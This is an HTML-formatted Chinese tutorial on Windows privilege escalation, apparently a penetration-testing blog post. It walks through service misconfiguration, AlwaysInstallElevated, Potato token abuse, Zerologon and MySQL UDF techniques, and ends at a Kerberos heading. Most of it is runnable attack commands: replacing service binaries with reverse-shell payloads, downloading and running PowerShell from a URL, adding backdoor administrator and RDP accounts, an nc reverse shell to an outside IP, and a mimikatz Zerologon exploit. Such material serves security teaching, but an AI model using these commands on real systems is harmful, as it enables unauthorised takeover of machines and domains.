@@ -1,0 +1,609 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="c776d45c900d209e9ded3673351645cb">内网权限提升前言</h1>
+<p>权限提升分为：</p>
+<ul>
+<li>横向权限提升：同级用户之间</li>
+<li>垂直权限提升：从较低级用户权限获得更高的用户权限</li>
+</ul>
+<p>本文将以垂直权限提升为中心讲解，并对windows下常见权限提升方法进行介绍</p>
+<h2 data-content="1" id="aae010c573e88449249b07e457689f63">系统内核漏洞提权</h2>
+<h3 data-content="1" id="63fae6c3896e1eb70ec6279e93082dfe">内核漏洞寻找</h3>
+<p>查看系统已安装补丁以及版本信息</p>
+<div class="highlight"><pre><span></span>systeminfo
+</pre></div>
+<h4 data-content="1" id="40d1a40129a8e7fafb5169c53fa342e5">借助工具WES-NG查找</h4>
+<p>WES-NG是一个基于Windows实用程序输出的工具，它提供了操作系统易受攻击的漏洞列表，包括对这些漏洞的任何攻击。支持Windows XP和Windows 11之间的每个windows操作系统，包括其Windows Server对应操作系统。</p>
+<p>先在本机上更新最新漏洞库</p>
+<div class="highlight"><pre><span></span>python3 wes.py <span class="o">--</span>update
+</pre></div>
+<p>在目标主机执行systeminfo命令并将结果保存在sysinfo.txt</p>
+<div class="highlight"><pre><span></span>systeminfo <span class="o">&gt;</span>sysinfo.txt
+</pre></div>
+<p>然后用工具WES进行检测</p>
+<div class="highlight"><pre><span></span>python3 wes.py sysinfo.txt <span class="o">--</span>impact <span class="s">"Elevation of Privilege"</span>
+python3 wes.py systeminfo.txt <span class="o">--</span>impact <span class="s">"Remote Code Execution"</span>
+<span class="c1">#仅显示公开的漏洞</span>
+python3 wes.py systeminfo.txt <span class="o">--</span>impact <span class="s">"Remote Code Execution"</span> <span class="o">-</span>e
+</pre></div>
+<h2 data-content="1" id="8987828c56aff35e9a3836269c788ff8">系统服务提权</h2>
+<p>通常用户安装的软件会在本地注册一些服务，并且大多数服务是在开机时候以system权限启动<br/>
+win+R输入regedit，按回车键进入注册表编辑器。<br/>
+软件在注册服务时，会在以下路径中创建相应的注册表项,路径如下：</p>
+<div class="highlight"><pre><span></span>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
+</pre></div>
+<p>ImagePath键对应的就是服务所启动的二进制程序<br/>
+如果让服务启动时执行其他程序，该程序就可以随着服务的启动获得系统权限，这是利用系统服务提权的主要思路。</p>
+<h3 data-content="1" id="36c674dadc61b6ac9f6564dcbe959b2f">不安全的服务权限</h3>
+<p><strong>ACL</strong> 定义了安全对象的访问控制策略，用于规定哪些主体对其拥有访问权限和拥有什么样的权限。Windows 的系统服务正是通过 ACL 来指定用户对其拥有的权限，常见的权限列表如下：</p>
+<table>
+<thead>
+<tr>
+<th>权限</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>SERVICE_START</td>
+<td>启动服务的权限</td>
+</tr>
+<tr>
+<td>SERVICE_STOP</td>
+<td>停止服务的权限</td>
+</tr>
+<tr>
+<td>SERVICE_PAUSE_CONTINUE</td>
+<td>暂停/继续运行服务的权限</td>
+</tr>
+<tr>
+<td>SERVICE_QUERY_STATUS</td>
+<td>查询服务状态的权限</td>
+</tr>
+<tr>
+<td>SERVICE_QUERY_CONFIG</td>
+<td>查询服务配置的权限</td>
+</tr>
+<tr>
+<td>SERVICE_CHANGE_CONFIG</td>
+<td>更改服务配置的权限</td>
+</tr>
+<tr>
+<td>SERVICE_ALL_ACCESS</td>
+<td>完全控制权限</td>
+</tr>
+</tbody>
+</table>
+<p>如果用户在配置服务时使得低权限用户对高权限下运行的系统服务拥有更改服务配置的权限，我们就可以直接修改系统服务启动时的二进制文件路径。</p>
+<h4 data-content="1" id="3537ec9622d0a5c6fd675a794632585c">AccessChk ACL权限检测工具</h4>
+<p><strong>AccessChk</strong>工具可以枚举目标主机上存在权限缺陷的系统服务。AccessChk是微软官方提供的管理工具，常用来枚举或查看系统中指定用户、组对特定资源(包括但不限于文件、文件夹、注册表、全局对象和系统服务等)的访问权限。</p>
+<p>工具地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk" target="_blank">https://docs.microsoft.com/zh-cn/sysinternals/downloads/accesschk</a></p>
+<p>低权限用户可以检查<strong>Authenticated Users</strong>组和<strong>INTERACTIVE</strong>组对系统服务的权限。前者为经过身份验证的用户，包含系统中所有使用用户名、密码登录并通过身份验证的账户，但不包括来宾账户；后者为交互式用户组，包含系统中所有直接登录到计算机进行操作的用户。默认情况下，这两个组为计算机本地“Users”组的成员。</p>
+<p>枚举”Authenticated Users”组是否具有更改服务配置的权限</p>
+<div class="highlight"><pre><span></span><span class="m">.</span>\accesschk.exe <span class="o">/</span>accepteula <span class="o">-</span>uwcqv <span class="s">"Authenticated Users"</span> <span class="o">*</span>
+</pre></div>
+<p>例如发现：该组对InsproSvc服务具有更改服务配置的权限，然后执行下面的命令，我们就可以将该服务启动时执行的二进制文件替换为我们上传的攻击载荷</p>
+<div class="highlight"><pre><span></span>sc config InsproSvc binpath<span class="o">=</span> <span class="s">"cmd.exe /k C:\Users\Public\reverse_tcp.exe"</span><span class="c1">#binpath，指定服务的二进制文件路径，注意“=”后必须有一个空格</span>
+</pre></div>
+<p>如果当前用户对该服务拥有SERVICE_STOP和SERVICE_START权限，即我们拥有可以重启服务的权限</p>
+<div class="highlight"><pre><span></span>sc stop <span class="o">&lt;</span>service name<span class="o">&gt;</span>
+sc start <span class="o">&lt;</span>service name<span class="o">&gt;</span>
+</pre></div>
+<p>如果没有权限，对于启动类型为”自动“的服务，可以重启计算机来实现服务重启</p>
+<div class="highlight"><pre><span></span>shutdown <span class="o">-</span>r <span class="o">-</span>t <span class="m">0</span>
+</pre></div>
+<h3 data-content="1" id="261ea836d09b137a198d848f33a02944">服务的注册表权限错误</h3>
+<p>Windows 的注册表中存储了每个系统服务的条目，而注册表使用 ACL 来管理用户对其所拥有的访问权限。如果注册表的 ACL配置错误，使得一个低权限用户对服务的注册表拥有写入权限，此时可以通过修改注册表来更改服务配置。例如修改注册表中的ImagePath键。</p>
+<p>枚举”Authenticated Users”是否具有服务注册表写入权限的用户</p>
+<div class="highlight"><pre><span></span>accesschk.exe <span class="o">/</span>accepteula <span class="o">-</span>uvwqk <span class="s">"Authenticated Users"</span> HKLM\SYSTEM\CurrentControlSet\Services
+</pre></div>
+<p>假如：该用户组对RegSvc服务的注册表具有完全控制权限<br/>
+将注册表中的ImagePath键指向我们上传的攻击载荷</p>
+<div class="highlight"><pre><span></span>reg add HKLM\SYSTEM\CurrentControlSet\Services\RegSvc <span class="o">/</span>v ImagePath <span class="o">/</span>t REG_EXPAND_SZ <span class="o">/</span>d <span class="s">"cmd.exe /k C:\Users\Public\reverse_tcp.exe"</span> <span class="o">/</span>f
+</pre></div>
+<ul>
+<li>
+<code>/k</code> 参数确保命令提示符窗口在执行完 <code>reverse_tcp.exe</code> 后仍然保持打开状态。</li>
+</ul>
+<p>检查当前用户对该服务是否有重启权限：</p>
+<div class="highlight"><pre><span></span>accesschk.exe <span class="o">/</span>accepteula <span class="o">-</span>ucqv <span class="s">"Authenticated Users"</span> RegSvc
+</pre></div>
+<p>然后重启提权</p>
+<pre><code>sc start RegSvc</code></pre>
+<h3 data-content="1" id="8f7844506d4a8e02f4484f2d54c734df">服务路径权限可控</h3>
+<p>如果目标主机上用户存在错误配置或操作，使得一个低权限的用户对此服务调用的二进制文件或其所在目录拥有写入权限，那么可以直接将该文件替换成攻击载荷，并随着服务的启动继承系统权限。</p>
+<p>执行下面命令查看InsexeSvc这个服务的二进制文件所在的目录是否有写入权限</p>
+<pre><code>accesschk.exe /accepteula /quv "C:\Program Files\Insecure Executables</code></pre>
+<p>结果中看到”INTERACTIVE”组对该文件夹具有完全控制权限、</p>
+<p>该组包含所有能够登录到系统的成员。此时，可以将InsexeSvc 服务的二进制文件替换成一个同名的攻击载荷，并随着服务的重启继承系统权限</p>
+<div class="highlight"><pre><span></span>cd <span class="s">"C:\Program Files\Insecure Executables"</span>
+cp InsexecSvc.exe InsexsSvc.exe.bak
+然后上传一个同名的reverse_tcp.exe
+shutdown <span class="o">-</span>r <span class="o">-</span>t <span class="m">0</span>
+</pre></div>
+<h3 data-content="1" id="d26346075e860266815bd4bbcf0154ac">未引用的服务路径</h3>
+<p>利用前提：具有相应目录下的<strong>写入权限</strong><br/>
+未引用的服务路径(Unquoted Service Path)漏洞曾被称为可信任的服务路径(TrustedService Path)，利用了 Windows 文件路径解析的特性。当服务启动所执行的二进制文件的路径中包含空格且未有效包含在引号中时，就会导致该漏洞。</p>
+<p>造成该漏洞的根本原因在于 Windows 系统中用于创建进程的 CreateProcess 函数。</p>
+<p>如果完整路径中包含空格且未有效包含在引号中，那么对于该路径中的每个空格Windows 会按照从左到右的顺序依次尝试寻找并执行与空格前的名字相匹配的程序。例如,对于路径 C:\Program Files\Sub Dir\Program Name.exe,系统依次寻找并执行以下程序C:\Program.exe，C:Program Files\Sub.exe ，C:\Program Files\Sub Dir\Program.exe，C:\Program Files\Sub Dir\Program Name.exe 。</p>
+<blockquote>
+<p>当系统进行该路径尝试的时候，会以当前服务所拥有的权限进行。所以当对受影响的目录具有写入权限时，可以上传一个特殊命名的攻击载荷到该目录中</p>
+</blockquote>
+<p>枚举主机上所有有该漏洞的服务</p>
+<div class="highlight"><pre><span></span>wmic service get DisplayName<span class="p">,</span> PathName<span class="p">,</span> StartMode\<span class="o">|</span>findstr <span class="o">/</span>i <span class="o">/</span>v <span class="s">"C:\Windows\\"</span> \<span class="o">|</span>findstr <span class="o">/</span>i <span class="o">/</span>v <span class="s">"""</span>
+</pre></div>
+<p>用Accesschk检查该受影响的目录是否有写入权限</p>
+<div class="highlight"><pre><span></span>accesschk.exe <span class="o">/</span>accepteula  <span class="o">-</span>quv <span class="s">"Authenticated Users"</span> <span class="s">"</span><span class="err">C:\Program Files\Unquoted Path\</span><span class="s">"</span>
+</pre></div>
+<h3 data-content="1" id="d621672b4fd042739cf39151655c196e"><strong>PowerUp</strong></h3>
+<p>powerup就是一个powershell脚本，里面集中了上面所说的服务进程提权的所有方法。使用方法可以去看官方文档</p>
+<p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit/" target="_blank">https://github.com/PowerShellMafia/PowerSploit/</a><br/>
+这里有一篇使用的文章：<a href="https://blog.51cto.com/binghe001/5247921" target="_blank">https://blog.51cto.com/binghe001/5247921</a></p>
+<p>使用方法</p>
+<div class="highlight"><pre><span></span><span class="c1">#先开启powershell</span>
+ powershell.exe <span class="o">-</span>nop <span class="o">-</span>exec bypass
+ <span class="c1">#导入模块</span>
+ Import<span class="o">-</span>Module <span class="m">.</span>\PowerSploit.psm1
+
+输入可以通过tab键来自动补全，如果要查看各个模块的详细说明，可以使用”<span class="sb">`Get-help [cmdlet] -full`</span>“来查看，比如”
+Get<span class="o">-</span>Help <span class="kp">Find</span><span class="o">-</span>DLLHijack <span class="o">-</span>full
+
+<span class="c1">#如果要将输出的结果导出到一个文件可以使用`Out-File`，如下：</span>
+Invoke<span class="o">-</span>AllChecks <span class="o">|</span> Out<span class="o">-</span>File <span class="o">-</span>Encoding ASCII checks.txt
+
+
+在cmd环境下，可以使用下列方式来运行该脚本：使用了Invoke<span class="o">-</span>AllChecks，脚本将会进行所有的检查
+powershell.exe <span class="o">-</span>exec bypass <span class="o">-</span>Command <span class="s">"&amp; {Import-Module .\PowerSploit.psm1; Invoke-AllChecks}"</span>
+</pre></div>
+<p>如果你想在内存加载此脚本，可以用下列方式：</p>
+<div class="highlight"><pre><span></span>powershell <span class="o">-</span>nop <span class="o">-</span>exec bypass <span class="o">-</span><span class="kt">c</span> <span class="s">"IEX (New-Object Net.WebClient).DownloadString('http://dwz.cn/2vkbfP'); Invoke-AllChecks"</span>
+</pre></div>
+<h3 data-content="1" id="3a29fd6e48c6b0500108981d49b03533">实战</h3>
+<p>执行Invoke-AllChecks:</p>
+<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">E</span><span class="p">:</span><span class="err">\</span><span class="p">&gt;</span> <span class="n">Invoke</span><span class="p">-</span><span class="n">AllChecks</span>
+</pre></div>
+<p>执行以后找到下列问题：</p>
+<div class="highlight"><pre><span></span><span class="c">#!bash</span>
+<span class="c">[*] Ch</span><span class="nv">ecking</span> <span class="kp">for</span> <span class="nv">unquoted</span> <span class="nv">service</span> <span class="nv">paths</span><span class="p">...</span>
+
+<span class="c">Servic</span><span class="nv">eName</span>   <span class="p">:</span> <span class="nv">CDROM_Detect</span>
+<span class="c">Path  </span>        <span class="p">:</span> <span class="nv">C</span><span class="p">:</span><span class="err">\</span><span class="kp">Program</span> <span class="nv">Files</span><span class="err">\</span><span class="mi">4</span><span class="nv">G</span> <span class="nv">USB</span> <span class="nv">Modem</span><span class="err">\</span><span class="mi">4</span><span class="nv">G_Eject</span><span class="p">.</span><span class="nv">exe</span>
+<span class="c">StartN</span><span class="nv">ame</span>     <span class="p">:</span> <span class="nv">LocalSystem</span>
+<span class="c">AbuseF</span><span class="nv">unction</span> <span class="p">:</span> <span class="nv">Write-ServiceBinary</span> <span class="o">-</span><span class="nv">ServiceName</span> <span class="s1">'CDROM_Detect'</span> <span class="o">-</span><span class="nv">Path</span> <span class="o">&lt;</span><span class="nv">HijackPath</span><span class="o">&gt;</span>
+
+<span class="c">Servic</span><span class="nv">eName</span>   <span class="p">:</span> <span class="nv">hMailServer</span>
+<span class="c">Path  </span>        <span class="p">:</span> <span class="nv">C</span><span class="p">:</span><span class="err">\</span><span class="kp">Program</span> <span class="nv">Files</span> <span class="p">(</span><span class="nv">x86</span><span class="p">)</span><span class="err">\</span><span class="nv">hMailServer</span><span class="err">\</span><span class="nv">Bin</span><span class="err">\</span><span class="nv">hMailServer</span><span class="p">.</span><span class="nv">exe</span> <span class="nv">RunAsService</span>
+<span class="c">StartN</span><span class="nv">ame</span>     <span class="p">:</span> <span class="nv">LocalSystem</span>
+<span class="c">AbuseF</span><span class="nv">unction</span> <span class="p">:</span> <span class="nv">Write-ServiceBinary</span> <span class="o">-</span><span class="nv">ServiceName</span> <span class="s1">'hMailServer'</span> <span class="o">-</span><span class="nv">Path</span> <span class="o">&lt;</span><span class="nv">HijackPath</span><span class="o">&gt;</span>
+
+<span class="c">[*] Ch</span><span class="nv">ecking</span> <span class="nv">service</span> <span class="nv">executable</span> <span class="ow">and</span> <span class="nv">argument</span> <span class="nv">permissions</span><span class="p">...</span>
+
+<span class="c">Servic</span><span class="nv">eName</span>    <span class="p">:</span> <span class="nv">wampapache</span>
+<span class="c">Path  </span>         <span class="p">:</span> <span class="s2">"c:\wamp\bin\apache\apache2.2.17\bin\httpd.exe"</span> <span class="o">-</span><span class="nv">k</span> <span class="nv">runservice</span>
+<span class="c">Modifi</span><span class="nv">ableFile</span> <span class="p">:</span> <span class="nv">c</span><span class="p">:</span><span class="err">\</span><span class="nv">wamp</span><span class="err">\</span><span class="nv">bin</span><span class="err">\</span><span class="nv">apache</span><span class="err">\</span><span class="nv">apache2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">17</span><span class="err">\</span><span class="nv">bin</span><span class="err">\</span><span class="nv">httpd</span><span class="p">.</span><span class="nv">exe</span>
+<span class="c">StartN</span><span class="nv">ame</span>      <span class="p">:</span> <span class="nv">LocalSystem</span>
+<span class="c">AbuseF</span><span class="nv">unction</span>  <span class="p">:</span> <span class="nv">Install-ServiceBinary</span> <span class="o">-</span><span class="nv">ServiceName</span> <span class="s1">'wampapache'</span>
+
+<span class="c">Servic</span><span class="nv">eName</span>    <span class="p">:</span> <span class="nv">wampmysqld</span>
+<span class="c">Path  </span>         <span class="p">:</span> <span class="nv">c</span><span class="p">:</span><span class="err">\</span><span class="nv">wamp</span><span class="err">\</span><span class="nv">bin</span><span class="err">\</span><span class="nv">mysql</span><span class="err">\</span><span class="nv">mysql5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">8</span><span class="err">\</span><span class="nv">bin</span><span class="err">\</span><span class="nv">mysqld</span><span class="p">.</span><span class="nv">exe</span> <span class="nv">wampmysqld</span>
+<span class="c">Modifi</span><span class="nv">ableFile</span> <span class="p">:</span> <span class="nv">c</span><span class="p">:</span><span class="err">\</span><span class="nv">wamp</span><span class="err">\</span><span class="nv">bin</span><span class="err">\</span><span class="nv">mysql</span><span class="err">\</span><span class="nv">mysql5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">8</span><span class="err">\</span><span class="nv">bin</span><span class="err">\</span><span class="nv">mysqld</span><span class="p">.</span><span class="nv">exe</span>
+<span class="c">StartN</span><span class="nv">ame</span>      <span class="p">:</span> <span class="nv">LocalSystem</span>
+<span class="c">AbuseF</span><span class="nv">unction</span>  <span class="p">:</span> <span class="nv">Install-ServiceBinary</span> <span class="o">-</span><span class="nv">ServiceName</span> <span class="s1">'wampmysqld'</span>
+</pre></div>
+<p>可以看出，Powerup列出了可能存在问题的服务，并在AbuseFunction中给了接下来的利用方式。在上面两个利用点可以看出，<code>unquoted service paths</code>中给出了两个路径带空格的文件路径，但是因为其在c盘，没有权限，所以并不能被我们利用来提权。而第二个检查通过<code>Get-ServiceFilePermission</code>找到两个当前用户可以写入相关联可执行文件的路径，我们就可以通过这个来进行提权。在AbuseFunction那里已经给了我们操作方式，接下来我们执行如下操作：</p>
+<p>添加管理员账户：</p>
+<div class="highlight"><pre><span></span><span class="c">#!bash</span><span class="nv">PS</span> <span class="nf">E</span><span class="p">:</span><span class="err">\</span><span class="o">&gt;</span> <span class="nv">Install-ServiceBinary</span> <span class="o">-</span><span class="nv">ServiceName</span> <span class="s1">'wampapache'</span> <span class="o">-</span><span class="nv">UserName</span> <span class="nv">rockyou</span> <span class="o">-</span><span class="nv">Password</span> <span class="mi">123</span><span class="nv">qwe</span><span class="err">!@#</span>
+</pre></div>
+<h2 data-content="1" id="1339815208b9a096c135c20a3ba29273">MSI 安装策略提权</h2>
+<p>MSI安装策略提权是由于用户在配置MSI安装策略时，启用了<strong>永远以高特权进行安装</strong>(AlwaysInstallElevated，默认情况下为禁用状态)，使得任何权限的用户都可以通过 SYSTEM 权限安装MSI程序。此时测试人员可以在目标主机上安装一个预先制作的恶意MSI文件，以获得SYSTEM 权限。</p>
+<h3 data-content="1" id="05a320702455171f1e8d89ae5193e589">确定系统是否存在漏洞</h3>
+<p>如果用户配置了”永远以高特权进行安装”，会在注册表下面两个位置创建键值1</p>
+<p>执行下面的命令进行确认</p>
+<div class="highlight"><pre><span></span>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="o">/</span>v AlwaysInstallElevatedreg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer <span class="o">/</span>v AlwaysInstallElevated
+</pre></div>
+<p>如果存在,用powerup来进行提权添加管理员账户<br/>
+生成一个安装文件，运行这个安装文件，则弹出添加用户的框。</p>
+<div class="highlight"><pre><span></span>powershell <span class="o">-</span>nop <span class="o">-</span>exec bypass <span class="s">"IEX(New-Object Net.WebClient).DownloadString('c:/PowerUp.ps1');Write-UserAddMSI"</span>
+</pre></div>
+<h2 data-content="1" id="41ba13650e62b6c49ba1c6d07b09ebcb">访问令牌操作</h2>
+<p>Windows 操作系统的访问控制模型(Access Control Model)是 Windows 系统安全性的基础构件，由访问令牌(Access Token)和安全描述符(Security Descriptor)两部分组成，二者分别被访问者和被访问者所持有。通过比较访问令牌和安全描述符的内容Windows 可以对访问者是否拥有访问资源对象的能力进行判定。</p>
+<h3 data-content="1" id="d725ca22c3ae933a90e426c18d2054b1">常规令牌窃取操作</h3>
+<p>常规的令牌窃取操作往往用来将从<strong>管理员权限</strong>提升至<strong>SYSTEM、TrustedInstaller</strong> 等更高的系统权限。在实战中，如果本地管理员账户因为某些组策略设置无法获取某些特权，可以通过令牌窃取来假冒 NT AUTHORITY\SYSTEM 的令牌，以获取更高的系统权限。此外，令牌窃取还经常被用于降权或用户切换等操作。</p>
+<p>注意：<strong>令牌窃取</strong>只能在<strong>特权用户</strong>上下文中才能完成，因为通过令牌创建进程使用的CreateProcessWithTokenW和 CreateProcessAsUserA 两个 WindowsAPI分别要求用户必须拥有<strong>SeImpersonatePrivilege</strong>和 <strong>SeAssignPrimaryTokenPrivilege/SeIncreaseQuotaPrivilege</strong> 特权，而拥有这两个特权的用户一般为系统管理员账户、网络服务账户和系统服务账户(如IIS、MSSQL 等)。</p>
+<h3 data-content="1" id="a91814bf99608ee2000bdb5583390fe2">Potato家族提权</h3>
+<p>Potato家族是一种常用的提权技术，通过操纵访问令牌将已获取的Windows服务账户权限提升至系统SYSTEM权限。<br/>
+通过滥用前面令牌窃取提到的两个前提特权，将已获取的 NT AUTHORITY\SYSTEM 账户的访问令牌传入CreateProcessWithTokenW或CreateProcessAsUserA函数进行调用，从而在NT AUTHORITY\SYSTEM 账户的上下文创建新进程，以提升至SYSTEM权限。</p>
+<p>当用户具有<strong>SeImpersonatePrivilege</strong> 特权，可以调用 CreateProcessWithTokenW 以某个 Token 的权限启动新进程。(最常见的，一般 <strong>IIS 服务的用户</strong>都具有该类权限)<br/>
+当用户具有 <strong>SeAssignPrimaryTokenPrivilege</strong> 特权，可以调用 CreateProcessAsUserW 以指定用户权限启动新进程。(这个权限一般<strong>管理员</strong>才具有)</p>
+<h4 data-content="1" id="0a661b75158d038d8377576d07e5b1e6">Rotten Potato</h4>
+<p>即”烂土豆提权",Rotten Potato 提权的实现机制相当复杂，拦截 NTLM 身份认证请求，并伪造 NT AUTHORITY\SYSTEM 账户的访问令牌</p>
+<h4 data-content="1" id="df5e725c50477003ba06101554fb7852">Juicy Potato</h4>
+<p>Juicy Potato 与 Rotten Potato 的原理几乎完全相同，只是在后者的基础上做了扩展，以便更灵活利用 Rotten Potato。<br/>
+现在假设已经获取IIS服务账户的WebShell，查询当前的特权</p>
+<div class="highlight"><pre><span></span>whoami <span class="o">/</span>priv
+</pre></div>
+<p>上传 JuicyPotato 的利用程序，并根据操作系统版本选择一个可用的 COM 对象。在 Rotten Potato 中使用的 COM 对象为 BITS，而 Juicy Potato 为不同 Windows 版本提供了多个可以利用的COM对象。</p>
+<p>对于Windows Server2016，可以选择的对象有COMXblGameSave,其CLSID为<code>{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}</code></p>
+<p>运行 JuicyPotato，将获取 SYSTEM 权限并运行指定的攻击载荷，成功获取到了一个SYSTEM权限的Meterpreter</p>
+<div class="highlight"><pre><span></span>JuicyPotato.exe <span class="o">-</span>t t <span class="o">-</span>p <span class="s">"C:\inetpub\wwwroot\reverse_tcp.exe"</span> <span class="o">-</span>l <span class="m">6666</span> <span class="o">-</span>n <span class="m">135</span> <span class="o">-</span><span class="kt">c</span> <span class="p">{</span>F7FD3FD6<span class="m">-9994-452</span>D<span class="m">-8</span>DA7<span class="m">-9</span>A8FD87AEEF4<span class="p">}</span>
+<span class="c1">#-t，指定要使用 CreateProcesswithTokenW和CreateProcessAsUserA()中的哪个函数创建进程</span>
+<span class="c1">#-p，指定要运行的程序；-l，指定COM对象加载的端口</span>
+<span class="c1">#-n，指定本地RPC服务端口，默认为135；-c，指定COM对象的CLSID</span>
+</pre></div>
+<p>注意: 以上提权方法仅适用于 <strong>Windows 10 version 1809 和 Windows Server 2019 之前</strong>版本的系统。在之后的版本中，微软通过检查RPC 绑定字符串中指定的端口来修复了这个问题，修复后的系统无法通过原来的方法实现中间人攻击。</p>
+<h4 data-content="1" id="bc53e8998fb20729b2d3b0dd2f3170d8">PrintSpoofer（Pipe Potato）</h4>
+<p>该提权技术主要利用了打印机组件路径检查中存在的一个Bug，使高权限的服务能连接到测试人员创建的命名管道，以获取高权限账户的令牌来创建新进程。</p>
+<h4 data-content="1" id="3184f5a86f451f64a7e9a2b67f019db7"><strong>Sweet Potato</strong></h4>
+<p>集成了上面所有potato的功能<br/>
+添加rdp管理员</p>
+<div class="highlight"><pre><span></span>SweetPotato.exe <span class="o">-</span>a <span class="s">"net user test qwer1234! /add"</span>
+SweetPotato.exe <span class="o">-</span>a <span class="s">"net localgroup administrators test /add"</span>
+SweetPotato.exe <span class="o">-</span>a <span class="s">"REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal"</span> <span class="s">"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f"</span>
+</pre></div>
+<h3 data-content="1" id="69ad24c735992b5344c46d3d7cad3ab2">GodPotato</h3>
+<p>影响版本：<br/>
+Windows Server 2012 - Windows Server 2022 Windows8 - Windows 11</p>
+<p>只要有“ImpersonatePrivilege”权限。那么你就是 “NT AUTHORITY\SYSTEM”，通常 WEB 服务和数据库服务都有 “ImpersonatePrivilege” 权限。</p>
+<p>当我们获得 WEB/数据库权限时，通常会使用 Potato 权限提升。我们可以将具有低权限的服务用户提升为“NT AUTHORITY\SYSTEM”权限。</p>
+<div class="highlight"><pre><span></span>GodPotato <span class="o">-</span>cmd <span class="s">"cmd /c whoami"</span>
+</pre></div>
+<p>Execute reverse shell commands</p>
+<div class="highlight"><pre><span></span>GodPotato <span class="o">-</span>cmd <span class="s">"nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"</span>
+</pre></div>
+<h2 data-content="1" id="1a08a89a44c62ef38dc3743d5d23b809">用户凭据操作</h2>
+<h3 data-content="1" id="4e587e2efef4ff2387fe0e1b6ca53e48">枚举Unattended凭据</h3>
+<h3 data-content="1" id="de4d120cea2a7507d5353c2a1e8fbd56">Zerologon域内提权</h3>
+<p>Zerologon(CVE-2020-1472)是Netlogon远程协议的一个特权提升漏洞，可以在不提供任何凭据的情况下通过身份验证，并实现域内提权。<br/>
+使用mimikatz</p>
+<pre><code>mimikatz.exe "lsadump::zerologon /target:10.10.10.11 /ntlm /null /account:Dc-1$/exploit" exit# /target，指定域控地址；/account，指定域控的机器账户</code></pre>
+<h3 data-content="1" id="1a0b06cfbba9786009f7b33bca6e1316">Certifried域内提权</h3>
+<p>Active Directory 域权限提升漏洞(CVE-2022-26923)。该漏洞是由于对用户属性的不正确获取，允许低权限用户在安装了活动目录证书服务(Active Directory Certificate Services，AD CS)服务器角色的活动目录环境中将权限提升至域管理员。</p>
+<h3 data-content="1" id="0653ab5a8e7e94ef299d6738e506c860">mysql UDF 提权</h3>
+<h4 data-content="1" id="610836394da65da36e90e4e53f54f85c">UDF 提权原理</h4>
+<p>UDF 指的是用户自定义函数，用户可以对数据库所使用的函数进行一个扩展（利用 dll 文件），从而定制一些符合自己需求的函数，但是同样的，当黑客获取了数据库的 root 用户的一个权限时，即使所在的系统权限很低，也可以使用 UDF 来自定义一个执行系统命令的函数，但是执行权限为管理员权限，从而可以用来添加管理员账户，远程连接。</p>
+<h4 data-content="1" id="64dfdf4ef73ce5705c39b107c1606aff">提权条件</h4>
+<ol>
+<li>必须是 root 权限（主要是得创建和抛弃自定义函数）</li>
+<li>secure_file_priv =</li>
+<li>将 udf.dll 文件上传到 MySQL 的 plugin 目录下（这里以 MySQL = 5.5.29 为例）</li>
+</ol>
+<p>查看 secure_file_priv 的值（他必须是空白值，只要有内容就不能进行 UDF 提权）</p>
+<div class="highlight"><pre><span></span><span class="k">show</span> <span class="k">global</span> <span class="n">variables</span> <span class="k">like</span> <span class="ss">"secure%"</span><span class="p">;</span>
+</pre></div>
+<p>查看 mysql 绝对路径</p>
+<div class="highlight"><pre><span></span><span class="k">SHOW</span> <span class="n">VARIABLES</span> <span class="k">LIKE</span> <span class="ss">"%plugin%"</span><span class="p">;</span>
+</pre></div>
+<p>创建文件夹( 你要提权系统的 mysql 的绝对路径 )</p>
+<div class="highlight"><pre><span></span><span class="k">select</span> <span class="s1">'xxx'</span> <span class="k">into</span> <span class="n">dumpfile</span><span class="s1">'C:\\phpstudy_pro\\Extensions\\MySQL5.5.29\\lib::$INDEX_ALLOCATION'</span><span class="p">;</span> <span class="k">select</span> <span class="s1">'xxx'</span> <span class="k">into</span> <span class="n">dumpfile</span><span class="s1">'C:\\phpstudy_pro\\Extensions\\MySQL5.5.29\\lib\\plugin::$INDEX_ALLOCATION'</span><span class="p">;</span>
+</pre></div>
+<p>虽然语句会出现报错，但是文件夹会成功创建。</p>
+<p>利用 msf 的 exploit/multi/mysql/mysql_udf_payload 生成一个 dll 的 payload，上传到\lib\plugin 目录下</p>
+<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="err">生成的</span><span class="n">payload内容</span> <span class="k">into</span> <span class="n">dumpfile</span> <span class="s1">'C:\\phpstudy_pro\\Extensions\\MySQL5.5.29\\lib\\plugin\\udf.dll'</span><span class="p">;</span>
+</pre></div>
+<p>定义别名</p>
+<div class="highlight"><pre><span></span><span class="k">CREATE</span> <span class="k">FUNCTION</span> <span class="n">sys_eval</span> <span class="k">RETURNS</span> <span class="n">STRING</span> <span class="n">SONAME</span> <span class="s1">'udf.dll'</span><span class="p">;</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="k">select</span> <span class="n">sys_eval</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">);</span>
+</pre></div>
+<h1 data-content="1" id="bc5a745f87fe68aa6018dfe045843adb">Kerberos认证前言</h1>
+<p>Kerberos是一种广泛应用于网络环境中的身份验证协议，旨在为客户端和服务器之间的通信提供安全的身份验证机制。然而，尽管Kerberos协议设计上较为安全，但在实际应用中仍存在多种攻击手段，这些攻击手段可以绕过或破坏Kerberos的身份验证机制。本文将从Kerberos认证过程中的各个部分进行攻击利用并会给出相应在内网渗透过程中需要用到的具体工具命令，方便师傅们学习使用。</p>
+<h2 data-content="1" id="01a2ca31488137bab04f22d4dd983cb8">Kerberos介绍</h2>
